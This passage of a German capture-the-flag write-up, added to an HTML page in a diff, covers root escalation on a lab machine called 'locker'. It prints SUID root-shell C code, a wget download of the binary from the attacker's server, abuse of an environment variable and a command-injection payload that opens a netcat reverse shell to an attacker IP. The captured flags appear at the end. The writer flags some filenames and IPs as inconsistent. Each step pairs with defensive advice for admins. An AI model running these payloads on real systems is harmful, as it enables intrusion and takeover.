+             <p class="recommendation">**Empfehlung (Pentester):** Da keine einfachen SUID-Exploits sichtbar sind, prüfen Sie andere Vektoren: Kernel-Version (`uname -a`) auf bekannte Exploits, `sudo -l` (falls `sudo` doch vorhanden ist), Cronjobs (`ls -la /etc/cron.*`), laufende Prozesse und deren Berechtigungen, Fehlkonfigurationen in Diensten, ungeschützte private Schlüssel oder Konfigurationsdateien im Home-Verzeichnis des Webservers oder anderer Benutzer.<br>**Empfehlung (Admin):** Regelmäßig die SUID-Binaries überprüfen und auf das Minimum reduzieren. Fehlendes `sudo` könnte beabsichtigt sein, schränkt aber auch die Administration ein.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi shell.c</span></div>
+                     <pre>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]) <span class="comment"> // Korrigierter Typ für argv</span>
+
+{
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  return 0; <span class="comment">// Gute Praxis, einen Rückgabewert hinzuzufügen</span>
+}</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Auf dem Angreifer-System wird eine C-Datei (`shell.c`) mit `vi` erstellt. Diese Datei enthält ein einfaches C-Programm, das versucht, die Gruppen-ID (`setgid(0)`) und Benutzer-ID (`setuid(0)`) auf 0 (Root) zu setzen und dann eine Bash-Shell (`system("/bin/bash")`) zu starten.</p>
+            <p class="evaluation">**Bewertung:** Dies ist der Quellcode für einen klassischen SUID-Exploit oder ein Werkzeug zur Privilegieneskalation. Wenn dieses Programm kompiliert und auf dem Zielsystem mit gesetztem SUID-Bit und Root als Besitzer abgelegt wird, würde jeder Benutzer, der es ausführt, eine Root-Shell erhalten, da `setuid(0)` und `setgid(0)` vor dem Shell-Aufruf die Rechte auf Root ändern.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Kompilieren Sie diesen Code auf dem Angreifer-System (oder einem kompatiblen System) mit `gcc shell.c -o shell`. Laden Sie die kompilierte `shell`-Datei auf das Zielsystem hoch (z.B. ins `/tmp`-Verzeichnis). Suchen Sie nach einer Möglichkeit, diese Datei mit SUID-Root-Rechten auszustatten (z.B. durch eine Fehlkonfiguration, einen anderen Exploit oder wenn Sie kurzzeitig Root-Rechte erlangen).<br>**Empfehlung (Admin):** Verhindern Sie das Hochladen und Ausführen nicht vertrauenswürdiger Binärdateien. Überwachen Sie das Dateisystem auf neue SUID-Dateien.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gcc shell.c -o shell</span></div>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der zuvor erstellte C-Code (`shell.c`) wird auf dem Angreifer-System mit `gcc` kompiliert. Die ausführbare Datei wird `shell` genannt (`-o shell`).</p>
+            <p class="evaluation">**Bewertung:** Erstellt die ausführbare Binärdatei, die für den SUID-basierten Privesc-Versuch benötigt wird.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass die Kompilierung erfolgreich war. Bereiten Sie den Upload der `shell`-Datei auf das Zielsystem vor.<br>**Empfehlung (Admin):** Keine direkte Aktion, aber die Fähigkeit des Angreifers, Code zu kompilieren und hochzuladen, unterstreicht die Notwendigkeit von Egress-Filtering und Beschränkungen für den `www-data`-Benutzer.</p>
+
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@locker:/home/tolocker$ <span class="command">cd /tmp/</span></div>
+                     <div class="prompt">www-data@locker:/tmp$ <span class="command">wget http://192.168.2.121:8000/shellz</span></div> <span class="comment"><-- Dateiname 'shellz' hier?</span>
+                     <pre>--2022-11-05 21:56:23--  http://192.168.2.121:8000/shellz
+Connecting to 192.168.2.121:8000... <span class="password">connected.</span>
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: 16056 (16K) [application/octet-stream]
+Saving to: ‘shellz’
+
+shellz              100%[===================>]  15.68K  --.-KB/s    in 0s
+
+2022-11-05 21:56:23 (211 MB/s) - ‘shellz’ saved [16056/16056]</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Innerhalb der Reverse Shell auf dem Zielsystem wird ins `/tmp`-Verzeichnis gewechselt. Dann wird `wget` verwendet, um eine Datei namens `shellz` von einem HTTP-Server herunterzuladen, der auf dem Angreifer-System (`192.168.2.121`) auf Port 8000 läuft. Vermutlich ist `shellz` die zuvor kompilierte `shell`-Datei, die umbenannt wurde.</p>
+            <p class="evaluation">**Bewertung:** Der Download ist erfolgreich. Die kompilierte SUID-Shell-Datei befindet sich nun im `/tmp`-Verzeichnis des Zielsystems.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Machen Sie die heruntergeladene Datei ausführbar (`chmod +x shellz`). Fahren Sie mit dem Plan fort, diese Datei auszunutzen (siehe nächsten Schritte).<br>**Empfehlung (Admin):** Beschränken Sie die Möglichkeit für niedrig privilegierte Benutzer wie `www-data`, Dateien aus dem Netzwerk herunterzuladen (`wget`, `curl`) oder Programme in `/tmp` auszuführen (`noexec`-Mount).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>------------------------------------------------------------------------------------------</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 8000</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.112 - - [06/Nov/2022 02:56:00] "GET /shellz HTTP/1.1" 200 -</span>
+<span class="password">192.168.2.112 - - [06/Nov/2022 02:56:19] "GET /shellz HTTP/1.1" 200 -</span></pre>
+                     <pre>------------------------------------------------------------------------------------------</pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Dies zeigt die Ausgabe des einfachen Python-HTTP-Servers, der auf dem Angreifer-System gestartet wurde, um die `shellz`-Datei bereitzustellen. Die Log-Einträge bestätigen, dass das Zielsystem (`192.168.2.112`) die Datei erfolgreich heruntergeladen hat (Statuscode 200).</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den erfolgreichen Transfer der kompilierten Shell.</p>
+            <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine direkte Aktion erforderlich.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@locker:/tmp$ <span class="command">chmod +x shell</span></div> <span class="comment"><-- Dateiname hier 'shell'?</span>
+                     <div class="prompt">www-data@locker:/tmp$ <span class="command">export SUSHELL=/tmp/shell</span></div>
+                     <div class="prompt">www-data@locker:/tmp$ <span class="command">echo $SUSHELL</span></div>
+                     <pre>/tmp/shellz</pre> <span class="comment"><-- Ausgabe zeigt 'shellz'?</span>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Zurück in der Reverse Shell auf dem Zielsystem:
+1.  `chmod +x shell`: Macht die heruntergeladene Datei ausführbar. *Hinweis: Es scheint einen Widerspruch beim Dateinamen zu geben. Heruntergeladen wurde `shellz`, aber hier wird `shell` verwendet.*
+2.  `export SUSHELL=/tmp/shell`: Setzt eine Umgebungsvariable namens `SUSHELL` auf den Pfad der ausführbaren Datei. Dies ist eine spezifische Vorbereitung für einen Exploit, der diese Variable nutzt (oft im Zusammenhang mit `su` oder ähnlichen Programmen, die Umgebungsvariablen unter bestimmten Umständen beibehalten oder auswerten).
+3.  `echo $SUSHELL`: Gibt den Wert der Variable aus, um zu prüfen, ob sie korrekt gesetzt wurde. *Hinweis: Die Ausgabe `/tmp/shellz` widerspricht dem vorherigen `export`-Befehl, der `/tmp/shell` verwendete. Es ist unklar, welcher Dateiname nun korrekt ist, aber wahrscheinlich ist es `shellz`, wie heruntergeladen.*</p>
+            <p class="evaluation">**Bewertung:** Die Datei wird ausführbar gemacht, und eine Umgebungsvariable wird gesetzt. Dies deutet auf einen spezifischen Exploit-Pfad hin, der wahrscheinlich die `su`-Binärdatei involviert, da `su` manchmal Umgebungsvariablen wie `SUSHELL` oder `SHELL` auswertet, wenn es aufgerufen wird, um die zu startende Shell zu bestimmen. Wenn `su` als SUID root läuft, könnte dies zur Ausführung der präparierten `/tmp/shell(z)` als Root führen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, `su` (oder ein anderes Programm, das `SUSHELL` auswertet) aufzurufen, um zu sehen, ob die `/tmp/shell(z)`-Datei mit Root-Rechten ausgeführt wird. Stellen Sie sicher, dass der Dateiname in der `SUSHELL`-Variable korrekt ist.<br>**Empfehlung (Admin):** Konfigurieren Sie `su` und ähnliche Programme so, dass sie keine unsicheren Umgebungsvariablen wie `SUSHELL` oder `SHELL` aus der Umgebung des aufrufenden Benutzers übernehmen (`secure_path` und Bereinigung von Umgebungsvariablen in `/etc/sudoers` oder PAM-Konfigurationen). Vermeiden Sie die Ausführung von Programmen aus `/tmp`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+view-source:http://192.168.2.114/locker.php?image=;nc -e /bin/bash 192.168.2.121 5656</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Erneute Anzeige eines Reverse-Shell-Payloads. Die IP (`.114`) stimmt immer noch nicht mit dem Ziel (`.112`) überein. Der Port (`5656`) passt jedoch zum Listener.</p>
+             <p class="evaluation">**Bewertung:** Wahrscheinlich eine veraltete oder falsche Notiz im Originaltext. Der tatsächliche Exploit scheint über den `su`-Mechanismus mit der `SUSHELL`-Variable zu laufen.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Ignorieren Sie diesen spezifischen Payload, da der Exploit-Pfad über `su` und `SUSHELL` verfolgt wird.</p>
+
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# <span class="command">id</span></pre> <span class="comment"><-- Prompt ändert sich zu #, was root anzeigt</span>
+                    <pre><span class="command">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                </div>
+             </div>
+            <p class="analysis">**Analyse:** Die Ausgabe zeigt einen Prompt `#`, der typischerweise den Root-Benutzer kennzeichnet. Der `id`-Befehl wird ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Privilegieneskalation erfolgreich! Der `id`-Befehl bestätigt, dass der Benutzer nun `root` (UID 0, GID 0) ist. Der Exploit über die `SUSHELL`-Variable und wahrscheinlich `su` hat funktioniert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ziel erreicht! Sichern Sie den Root-Zugriff (z.B. SSH-Schlüssel hinzufügen). Suchen Sie nach den Flag-Dateien (`user.txt`, `root.txt`).<br>**Empfehlung (Admin):** Untersuchen Sie den Privesc-Vektor (wahrscheinlich unsichere Handhabung von Umgebungsvariablen durch `su`). Beheben Sie die Schwachstelle. Analysieren Sie die Aktionen, die der Angreifer als Root durchgeführt hat.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>Privilege Escalation erfolgreich</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Bestätigende Notiz des Pentesters.</p>
+             <p class="evaluation">**Bewertung:** Korrekt, Root-Zugriff wurde erlangt.</p>
+             <p class="recommendation">**Empfehlung (Pentester/Admin):** Keine Aktion erforderlich.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">c7d0a8de1e03b25a6f7ed2d91b94dad6</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">7140a59e697f44b8a8581cc85df76f4c</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 6. November 2022</p> <!-- Datum extrahiert -->
+    </footer>
+</body>
+</html>  
